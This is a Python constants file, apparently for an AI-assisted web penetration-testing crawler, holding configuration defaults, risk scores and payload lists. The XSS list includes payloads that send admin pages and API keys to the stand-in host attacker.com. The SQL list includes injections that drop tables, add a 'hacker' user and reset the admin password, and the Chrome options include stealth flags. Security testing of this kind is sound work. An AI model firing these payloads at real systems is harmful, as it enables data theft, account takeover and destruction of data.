"""
Constants and Configuration Defaults for Advanced Intelligent Web Crawler
Centralizes all magic numbers, strings, and configuration values
"""

from enum import Enum
from typing import Dict, List, Any

# Version Information
VERSION = "2.0.0"
APP_NAME = "Advanced Intelligent Web Crawler & AI Penetration Tester"

# Default Configuration Values
class DefaultConfig:
    """Default configuration values"""
    
    # AI Configuration
    AI_PROVIDER = "groq"
    AI_MODEL_GROQ = "llama-3.1-8b-instant"
    AI_MODEL_GEMINI = "gemini-2.0-flash-exp"
    AI_MODEL_OPENAI = "gpt-4"
    AI_MODEL_ANTHROPIC = "claude-3-sonnet-20240229"
    AI_MAX_RETRIES = 3
    AI_TIMEOUT = 30
    AI_CONTEXT_WINDOW = 2000
    
    # Browser Configuration
    BROWSER_HEADLESS = False
    BROWSER_STEALTH_MODE = True
    BROWSER_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    BROWSER_WINDOW_SIZE = "1920x1080"
    BROWSER_PAGE_LOAD_TIMEOUT = 30
    BROWSER_IMPLICIT_WAIT = 10
    
    # Security Configuration
    SECURITY_MAX_PAYLOADS_PER_TYPE = 10
    SECURITY_TEST_TIMEOUT = 10
    SECURITY_RETRY_FAILED_TESTS = True
    SECURITY_MAX_RETRIES = 3
    SECURITY_VULNERABILITY_THRESHOLD = 5
    
    # Network Configuration
    NETWORK_REQUEST_TIMEOUT = 30
    NETWORK_MAX_REDIRECTS = 5
    NETWORK_RETRY_TOTAL = 3
    NETWORK_RETRY_BACKOFF_FACTOR = 0.3
    NETWORK_RETRY_STATUS_FORCELIST = [429, 500, 502, 503, 504]
    
    # Performance Configuration
    PERFORMANCE_MAX_CONCURRENT_REQUESTS = 5
    PERFORMANCE_RATE_LIMIT = 1.0
    PERFORMANCE_MEMORY_LIMIT = "2GB"
    PERFORMANCE_CPU_LIMIT = 80
    
    # Logging Configuration
    LOGGING_LEVEL = "INFO"
    LOGGING_FILE_ENABLED = True
    LOGGING_FILE_PATH = "logs/crawler.log"
    LOGGING_JSON_FORMAT = True
    LOGGING_MAX_FILE_SIZE = "10MB"
    LOGGING_BACKUP_COUNT = 5
    LOGGING_CONSOLE_OUTPUT = True
    LOGGING_STRUCTURED_LOGGING = True
    
    # Privacy Configuration
    PRIVACY_SANITIZE_LOGS = True
    PRIVACY_MASK_SENSITIVE_DATA = True
    PRIVACY_RESPECT_ROBOTS_TXT = True
    
    # Monitoring Configuration
    MONITORING_INTERVAL = 2
    MONITORING_DOM_MONITORING = True
    MONITORING_CONSOLE_MONITORING = True
    MONITORING_NETWORK_MONITORING = True
    MONITORING_MAX_DOM_SIZE = 2000
    MONITORING_MAX_CONSOLE_ENTRIES = 100
    MONITORING_MAX_NETWORK_EVENTS = 50

# Risk Scoring Constants
class RiskScores:
    """Risk scoring constants"""
    CRITICAL = 9
    HIGH = 7
    MEDIUM = 5
    LOW = 3
    INFO = 1

# Vulnerability Types
class VulnerabilityTypes:
    """Vulnerability type constants"""
    XSS = "xss"
    SQL_INJECTION = "sql_injection"
    SSRF = "ssrf"
    IDOR = "idor"
    CSRF = "csrf"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    FILE_UPLOAD = "file_upload"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    SESSION_FIXATION = "session_fixation"
    INSECURE_DIRECT_OBJECT_REFERENCE = "insecure_direct_object_reference"
    SECURITY_MISCONFIGURATION = "security_misconfiguration"
    SENSITIVE_DATA_EXPOSURE = "sensitive_data_exposure"
    XML_EXTERNAL_ENTITY = "xml_external_entity"
    BROKEN_ACCESS_CONTROL = "broken_access_control"
    INJECTION = "injection"
    INSUFFICIENT_LOGGING = "insufficient_logging"
    VULNERABLE_COMPONENTS = "vulnerable_components"
    UNVALIDATED_REDIRECTS = "unvalidated_redirects"

# HTTP Status Codes
class HTTPStatus:
    """HTTP status code constants"""
    OK = 200
    CREATED = 201
    NO_CONTENT = 204
    BAD_REQUEST = 400
    UNAUTHORIZED = 401
    FORBIDDEN = 403
    NOT_FOUND = 404
    METHOD_NOT_ALLOWED = 405
    CONFLICT = 409
    INTERNAL_SERVER_ERROR = 500
    BAD_GATEWAY = 502
    SERVICE_UNAVAILABLE = 503
    GATEWAY_TIMEOUT = 504

# Timeout Constants (in seconds)
class Timeouts:
    """Timeout constants in seconds"""
    DEFAULT = 30
    SHORT = 10
    MEDIUM = 30
    LONG = 60
    VERY_LONG = 300
    PAGE_LOAD = 30
    ELEMENT_WAIT = 10
    AJAX_WAIT = 5
    API_REQUEST = 30
    FILE_DOWNLOAD = 60

# File Size Constants (in bytes)
class FileSizes:
    """File size constants in bytes"""
    KB = 1024
    MB = 1024 * KB
    GB = 1024 * MB
    MAX_LOG_FILE_SIZE = 10 * MB
    MAX_REPORT_SIZE = 50 * MB
    MAX_SCREENSHOT_SIZE = 5 * MB
    MAX_PAYLOAD_SIZE = 1 * KB

# Regex Patterns
class RegexPatterns:
    """Common regex patterns"""
    EMAIL = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    URL = r'https?://(?:[-\w.])+(?:[:\d]+)?(?:/(?:[\w/_.])*(?:\?(?:[\w&=%.])*)?(?:#(?:[\w.])*)?)?'
    IP_ADDRESS = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
    PHONE = r'\b(?:\+?1[-.\s]?)?\(?[0-9]{3}\)?[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}\b'
    CREDIT_CARD = r'\b(?:[0-9]{4}[-.\s]?){3}[0-9]{4}\b'
    SSN = r'\b[0-9]{3}-[0-9]{2}-[0-9]{4}\b'
    API_KEY = r'\b[A-Za-z0-9_-]{20,}\b'
    JWT_TOKEN = r'\beyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\b'

# XSS Payloads
class XSSPayloads:
    """XSS payload templates"""
    BASIC = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')></iframe>"
    ]
    
    ADVANCED = [
        "<script>fetch('/admin/users').then(r=>r.text()).then(d=>fetch('http://attacker.com/steal?data='+btoa(d)))</script>",
        "<img src=x onerror=\"fetch('/api/keys').then(r=>r.json()).then(d=>fetch('http://attacker.com/keys',{method:'POST',body:JSON.stringify(d)}))\">",
        "<svg onload=\"var xhr=new XMLHttpRequest();xhr.open('GET','/admin/panel');xhr.send();xhr.onload=()=>fetch('http://attacker.com/panel',{method:'POST',body:xhr.responseText})\">"
    ]
    
    CONTEXT_AWARE = {
        'html': "<script>alert('XSS')</script>",
        'attribute': "\" onmouseover=\"alert('XSS')\"",
        'javascript': "';alert('XSS');//",
        'css': "expression(alert('XSS'))",
        'url': "javascript:alert('XSS')"
    }

# SQL Injection Payloads
class SQLPayloads:
    """SQL injection payload templates"""
    BASIC = [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL--",
        "' OR 'x'='x"
    ]
    
    ADVANCED = [
        "' UNION SELECT username,password FROM users--",
        "'; INSERT INTO users (username,password) VALUES ('hacker','password'); --",
        "' OR 1=1 LIMIT 1 OFFSET 0--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'; --"
    ]
    
    TIME_BASED = [
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR SLEEP(5)--",
        "'; SELECT pg_sleep(5)--"
    ]

# Directory and File Paths
class Paths:
    """Directory and file path constants"""
    ROOT = "."
    LOGS = "logs"
    REPORTS = "reports"
    SCREENSHOTS = "screenshots"
    TEMP = "temp"
    CONFIG = "config.yaml"
    PAYLOADS_CONFIG = "payloads_config.yaml"
    ENV_EXAMPLE = ".env.example"
    ENV = ".env"
    REQUIREMENTS = "requirements.txt"
    README = "README.md"

# Browser User Agents
class UserAgents:
    """Common user agent strings"""
    CHROME_WINDOWS = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    CHROME_MAC = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    FIREFOX_WINDOWS = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
    FIREFOX_MAC = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0"
    SAFARI_MAC = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
    EDGE_WINDOWS = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"

# Chrome Options
class ChromeOptions:
    """Chrome browser options"""
    SECURITY = [
        "--disable-web-security",
        "--disable-features=VizDisplayCompositor",
        "--disable-dev-shm-usage",
        "--no-sandbox",
        "--disable-gpu",
        "--disable-extensions",
        "--disable-plugins"
    ]
    
    STEALTH = [
        "--disable-blink-features=AutomationControlled",
        "--disable-web-security",
        "--disable-features=VizDisplayCompositor",
        "--disable-dev-shm-usage",
        "--no-sandbox",
        "--disable-gpu",
        "--disable-extensions",
        "--disable-plugins"
    ]
    
    PERFORMANCE = [
        "--disable-gpu",
        "--disable-dev-shm-usage",
        "--no-sandbox",
        "--disable-extensions",
        "--disable-plugins",
        "--disable-images",
        "--disable-javascript"
    ]

# Error Messages
class ErrorMessages:
    """Common error messages"""
    CONFIG_NOT_FOUND = "Configuration file not found"
    INVALID_CONFIG = "Invalid configuration format"
    API_KEY_MISSING = "API key not found for provider"
    BROWSER_INIT_FAILED = "Failed to initialize browser"
    NETWORK_ERROR = "Network request failed"
    TIMEOUT_ERROR = "Operation timed out"
    ELEMENT_NOT_FOUND = "Element not found on page"
    STALE_ELEMENT = "Element reference is stale"
    WEBDRIVER_ERROR = "WebDriver operation failed"
    AI_PROVIDER_ERROR = "AI provider request failed"
    FILE_NOT_FOUND = "File not found"
    PERMISSION_DENIED = "Permission denied"
    INVALID_URL = "Invalid URL format"
    INVALID_PAYLOAD = "Invalid payload format"

# Success Messages
class SuccessMessages:
    """Common success messages"""
    CONFIG_LOADED = "Configuration loaded successfully"
    BROWSER_STARTED = "Browser started successfully"
    AI_INITIALIZED = "AI provider initialized successfully"
    SCAN_STARTED = "Security scan started"
    SCAN_COMPLETED = "Security scan completed"
    REPORT_GENERATED = "Report generated successfully"
    VULNERABILITY_FOUND = "Vulnerability detected"
    PAYLOAD_INJECTED = "Payload injected successfully"
    ELEMENT_FOUND = "Element found successfully"
    PAGE_LOADED = "Page loaded successfully"

# Log Levels
class LogLevels:
    """Log level constants"""
    DEBUG = "DEBUG"
    INFO = "INFO"
    WARNING = "WARNING"
    ERROR = "ERROR"
    CRITICAL = "CRITICAL"

# Report Formats
class ReportFormats:
    """Report format constants"""
    HTML = "html"
    JSON = "json"
    XML = "xml"
    PDF = "pdf"
    TXT = "txt"
    CSV = "csv"

# AI Providers
class AIProviders:
    """AI provider constants"""
    GROQ = "groq"
    GEMINI = "gemini"
    OPENAI = "openai"
    ANTHROPIC = "anthropic"

# Browser Types
class BrowserTypes:
    """Browser type constants"""
    CHROME = "chrome"
    FIREFOX = "firefox"
    SAFARI = "safari"
    EDGE = "edge"

# Operating Systems
class OperatingSystems:
    """Operating system constants"""
    WINDOWS = "windows"
    MACOS = "macos"
    LINUX = "linux"

# Database Types
class DatabaseTypes:
    """Database type constants"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    SQLITE = "sqlite"
    ORACLE = "oracle"
    SQLSERVER = "sqlserver"
    MONGODB = "mongodb"

# Content Types
class ContentTypes:
    """HTTP content type constants"""
    HTML = "text/html"
    JSON = "application/json"
    XML = "application/xml"
    FORM = "application/x-www-form-urlencoded"
    MULTIPART = "multipart/form-data"
    TEXT = "text/plain"
    CSS = "text/css"
    JAVASCRIPT = "application/javascript"
    PDF = "application/pdf"
    IMAGE_PNG = "image/png"
    IMAGE_JPEG = "image/jpeg"
    IMAGE_GIF = "image/gif"

# HTTP Methods
class HTTPMethods:
    """HTTP method constants"""
    GET = "GET"
    POST = "POST"
    PUT = "PUT"
    DELETE = "DELETE"
    PATCH = "PATCH"
    HEAD = "HEAD"
    OPTIONS = "OPTIONS"
    TRACE = "TRACE"
    CONNECT = "CONNECT"

# Security Headers
class SecurityHeaders:
    """Security header constants"""
    CONTENT_SECURITY_POLICY = "Content-Security-Policy"
    X_FRAME_OPTIONS = "X-Frame-Options"
    X_XSS_PROTECTION = "X-XSS-Protection"
    X_CONTENT_TYPE_OPTIONS = "X-Content-Type-Options"
    STRICT_TRANSPORT_SECURITY = "Strict-Transport-Security"
    REFERRER_POLICY = "Referrer-Policy"
    PERMISSIONS_POLICY = "Permissions-Policy"
    CROSS_ORIGIN_EMBEDDER_POLICY = "Cross-Origin-Embedder-Policy"
    CROSS_ORIGIN_OPENER_POLICY = "Cross-Origin-Opener-Policy"
    CROSS_ORIGIN_RESOURCE_POLICY = "Cross-Origin-Resource-Policy"